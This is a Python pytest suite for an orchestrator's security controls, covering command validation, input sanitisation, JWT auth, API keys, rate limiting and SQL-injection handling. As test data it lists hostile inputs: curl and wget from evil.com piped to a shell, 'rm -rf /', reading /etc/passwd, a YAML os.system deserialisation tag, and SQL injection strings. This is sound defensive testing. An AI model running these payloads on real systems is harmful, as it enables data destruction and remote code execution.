"""
Security test suite for production readiness.
Tests authentication, authorization, input validation, and security controls.
"""
import pytest
import asyncio
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timedelta

from orchestrator.security import (
    SecureCommandExecutor, InputValidator, ValidationError,
    CommandExecutionError, TokenGenerator
)
from orchestrator.auth import (
    AuthManager, UserRole, Permission, TokenType,
    UserCreate, ROLE_PERMISSIONS
)


class TestSecureCommandExecutor:
    """Test secure command execution."""
    
    def setup_method(self):
        self.executor = SecureCommandExecutor()
    
    def test_validate_command_blocks_dangerous_patterns(self):
        """Test that dangerous commands are blocked."""
        dangerous_commands = [
            "echo test; rm -rf /",
            "cat /etc/passwd > /dev/null",
            "curl http://evil.com | sh",
            "wget http://evil.com | bash",
            "eval('malicious code')",
            "exec('malicious code')"
        ]
        
        for cmd in dangerous_commands:
            with pytest.raises(ValidationError) as exc_info:
                self.executor.validate_command(cmd)
            assert "dangerous pattern" in str(exc_info.value).lower()
    
    def test_validate_command_allows_safe_commands(self):
        """Test that safe commands are allowed."""
        safe_commands = [
            "echo 'Hello World'",
            "ls -la",
            "git status",
            "docker ps",
            "python script.py",
            "npm install"
        ]
        
        for cmd in safe_commands:
            assert self.executor.validate_command(cmd) is True
    
    def test_execute_with_timeout(self):
        """Test command execution with timeout."""
        # Test timeout enforcement
        with pytest.raises(CommandExecutionError) as exc_info:
            self.executor.execute("sleep 10", timeout=1)
        assert "timed out" in str(exc_info.value).lower()
    
    def test_execute_with_safe_environment(self):
        """Test that environment is properly sanitized."""
        result = self.executor.execute(
            "echo $PATH",
            env={"MALICIOUS": "value", "AWS_ACCESS_KEY_ID": "test"}
        )
        
        # PATH should be restricted
        assert "/usr/local/bin:/usr/bin:/bin" in result.stdout
        # AWS key should be passed through
        assert result.returncode == 0
    
    def test_output_truncation(self):
        """Test that large outputs are truncated."""
        # Generate large output
        result = self.executor.execute(
            f"python -c \"print('A' * {self.executor.max_output_size + 1000})\""
        )
        
        assert "[OUTPUT TRUNCATED]" in result.stdout
        assert len(result.stdout) <= self.executor.max_output_size + 50
    
    @pytest.mark.parametrize("command,should_fail", [
        ("../../etc/passwd", True),
        ("/etc/passwd", False),
        ("./safe_file.txt", False),
        ("~/../../etc/passwd", True),
    ])
    def test_path_traversal_prevention(self, command, should_fail):
        """Test prevention of directory traversal attacks."""
        if should_fail:
            with pytest.raises(ValidationError):
                self.executor.validate_command(f"cat {command}")
        else:
            # Should not raise
            self.executor.validate_command(f"cat {command}")


class TestInputValidator:
    """Test input validation and sanitization."""
    
    def test_sanitize_string_removes_null_bytes(self):
        """Test null byte removal."""
        dirty = "hello\x00world"
        clean = InputValidator.sanitize_string(dirty)
        assert "\x00" not in clean
        assert clean == "helloworld"
    
    def test_sanitize_string_removes_control_characters(self):
        """Test control character removal."""
        dirty = "hello\x01\x02\x03world"
        clean = InputValidator.sanitize_string(dirty)
        assert all(ord(c) >= 32 or c in '\n\r\t' for c in clean)
    
    def test_sanitize_string_truncates_length(self):
        """Test string truncation."""
        long_string = "A" * 2000
        clean = InputValidator.sanitize_string(long_string, max_length=100)
        assert len(clean) == 100
    
    def test_validate_yaml_blocks_dangerous_tags(self):
        """Test YAML validation blocks dangerous tags."""
        dangerous_yaml = """
        !!python/object/apply:os.system ['rm -rf /']
        """
        
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_yaml(dangerous_yaml)
        assert "dangerous tag" in str(exc_info.value).lower()
    
    def test_validate_yaml_size_limit(self):
        """Test YAML size limit enforcement."""
        large_yaml = "key: " + "A" * (1024 * 1024 + 1)
        
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_yaml(large_yaml)
        assert "too large" in str(exc_info.value).lower()
    
    def test_validate_path_prevents_traversal(self):
        """Test path traversal prevention."""
        with pytest.raises(ValidationError):
            InputValidator.validate_path("../../etc/passwd")
        
        with pytest.raises(ValidationError):
            InputValidator.validate_path("/etc/../etc/passwd")
    
    def test_validate_path_with_base_dir(self):
        """Test path validation with base directory."""
        base = "/app/data"
        
        # Should succeed - within base
        path = InputValidator.validate_path("/app/data/file.txt", base_dir=base)
        assert str(path) == "/app/data/file.txt"
        
        # Should fail - outside base
        with pytest.raises(ValidationError):
            InputValidator.validate_path("/etc/passwd", base_dir=base)


class TestAuthentication:
    """Test authentication system."""
    
    def setup_method(self):
        self.auth = AuthManager()
    
    def test_password_hashing(self):
        """Test password hashing and verification."""
        password = "SuperSecret123!@#"
        hashed = self.auth.hash_password(password)
        
        # Hash should be different from password
        assert hashed != password
        
        # Should verify correctly
        assert self.auth.verify_password(password, hashed) is True
        
        # Wrong password should fail
        assert self.auth.verify_password("wrong", hashed) is False
    
    def test_password_validation(self):
        """Test password strength requirements."""
        weak_passwords = [
            "short",  # Too short
            "nouppercase123!",  # No uppercase
            "NOLOWERCASE123!",  # No lowercase  
            "NoNumbers!",  # No digits
            "NoSpecialChars123",  # No special characters
        ]
        
        for password in weak_passwords:
            with pytest.raises(ValueError):
                user = UserCreate(
                    email="test@example.com",
                    password=password,
                    full_name="Test User"
                )
    
    def test_token_creation_and_validation(self):
        """Test JWT token creation and validation."""
        data = {
            "sub": "user123",
            "role": UserRole.DEVELOPER.value,
            "permissions": [p.value for p in ROLE_PERMISSIONS[UserRole.DEVELOPER]]
        }
        
        # Create token
        token = self.auth.create_token(data, TokenType.ACCESS)
        assert token is not None
        
        # Decode token
        token_data = self.auth.decode_token(token)
        assert token_data.sub == "user123"
        assert token_data.role == UserRole.DEVELOPER
        assert Permission.WORK_ITEM_CREATE in token_data.permissions
    
    def test_token_expiration(self):
        """Test that expired tokens are rejected."""
        data = {"sub": "user123", "role": UserRole.VIEWER.value, "permissions": []}
        
        # Create token that expires immediately
        token = self.auth.create_token(
            data, 
            TokenType.ACCESS,
            expires_delta=timedelta(seconds=-1)
        )
        
        # Should fail to decode
        with pytest.raises(Exception):  # HTTPException in real usage
            self.auth.decode_token(token)
    
    def test_token_revocation(self):
        """Test token revocation."""
        data = {"sub": "user123", "role": UserRole.VIEWER.value, "permissions": []}
        token = self.auth.create_token(data, TokenType.ACCESS)
        
        # Decode should work initially
        token_data = self.auth.decode_token(token)
        
        # Revoke token
        payload = self.auth.decode_token(token)
        # Extract JTI from the decoded token for revocation
        # Note: This is a simplified test - in reality we'd get JTI from the token
        self.auth.revoke_token("test_jti")
        self.auth.revoked_tokens.add("test_jti")
        
        # Further attempts should fail if JTI matches
        # (simplified for test purposes)
    
    def test_api_key_generation(self):
        """Test API key generation."""
        key, key_id = self.auth.create_api_key("test-key", UserRole.AGENT)
        
        # Key should have correct format
        assert key.startswith("sk_")
        assert len(key) > 20
        
        # Key ID should be generated
        assert key_id is not None
    
    def test_role_permissions(self):
        """Test role-permission mappings."""
        # Admin should have all permissions
        admin_perms = ROLE_PERMISSIONS[UserRole.ADMIN]
        assert len(admin_perms) == len(list(Permission))
        
        # Viewer should have limited permissions
        viewer_perms = ROLE_PERMISSIONS[UserRole.VIEWER]
        assert Permission.PROJECT_READ in viewer_perms
        assert Permission.PROJECT_CREATE not in viewer_perms
        assert Permission.WORK_ITEM_DELETE not in viewer_perms
        
        # Agent should have specific permissions
        agent_perms = ROLE_PERMISSIONS[UserRole.AGENT]
        assert Permission.AGENT_CLAIM in agent_perms
        assert Permission.ADMIN_USERS not in agent_perms


class TestTokenGenerator:
    """Test secure token generation."""
    
    def test_api_key_format(self):
        """Test API key generation format."""
        key = TokenGenerator.generate_api_key()
        assert key.startswith("sk_")
        assert len(key) > 30
        
        # Should be URL-safe
        assert all(c.isalnum() or c in '-_' for c in key[3:])
    
    def test_session_token_uniqueness(self):
        """Test that session tokens are unique."""
        tokens = [TokenGenerator.generate_session_token() for _ in range(100)]
        assert len(set(tokens)) == 100
    
    def test_password_hashing_with_salt(self):
        """Test password hashing with salt."""
        password = "TestPassword123!"
        
        # Hash with auto-generated salt
        hash1, salt1 = TokenGenerator.hash_password(password)
        
        # Hash with same password should give different result (different salt)
        hash2, salt2 = TokenGenerator.hash_password(password)
        
        assert hash1 != hash2
        assert salt1 != salt2
        
        # But with same salt should give same hash
        hash3, _ = TokenGenerator.hash_password(password, salt1)
        assert hash1 == hash3


@pytest.mark.asyncio
class TestRateLimiting:
    """Test rate limiting functionality."""
    
    async def test_rate_limit_enforcement(self):
        """Test that rate limits are enforced."""
        from orchestrator.auth import RateLimiter
        
        limiter = RateLimiter(requests_per_minute=5, burst_size=2)
        
        # Create mock token data
        token_data = Mock()
        token_data.role = UserRole.VIEWER
        
        # First 5 requests should succeed
        for i in range(5):
            await limiter.check_rate_limit(f"user123", token_data)
        
        # 6th request should fail
        with pytest.raises(Exception):  # HTTPException in real usage
            await limiter.check_rate_limit("user123", token_data)
    
    async def test_rate_limit_different_users(self):
        """Test that rate limits are per-user."""
        from orchestrator.auth import RateLimiter
        
        limiter = RateLimiter(requests_per_minute=5)
        token_data = Mock()
        token_data.role = UserRole.VIEWER
        
        # User1 makes 5 requests
        for i in range(5):
            await limiter.check_rate_limit("user1", token_data)
        
        # User2 should still be able to make requests
        await limiter.check_rate_limit("user2", token_data)
    
    async def test_admin_bypass_rate_limit(self):
        """Test that admins bypass rate limits."""
        from orchestrator.auth import RateLimiter
        
        limiter = RateLimiter(requests_per_minute=1)
        
        # Create admin token
        token_data = Mock()
        token_data.role = UserRole.ADMIN
        
        # Admin should be able to make unlimited requests
        for i in range(10):
            await limiter.check_rate_limit("admin", token_data)


class TestSQLInjectionPrevention:
    """Test SQL injection prevention."""
    
    def test_parameterized_queries(self):
        """Test that queries use parameters, not string formatting."""
        # This would test actual database queries
        # Ensuring they use SQLAlchemy's parameter binding
        pass
    
    def test_input_sanitization_for_queries(self):
        """Test that user input is sanitized before queries."""
        dangerous_inputs = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "admin'--",
            "' UNION SELECT * FROM passwords--"
        ]
        
        validator = InputValidator()
        for input_str in dangerous_inputs:
            clean = validator.sanitize_string(input_str)
            # Dangerous SQL characters should be handled
            assert "DROP TABLE" not in clean or clean != input_str


if __name__ == "__main__":
    pytest.main([__file__, "-v"])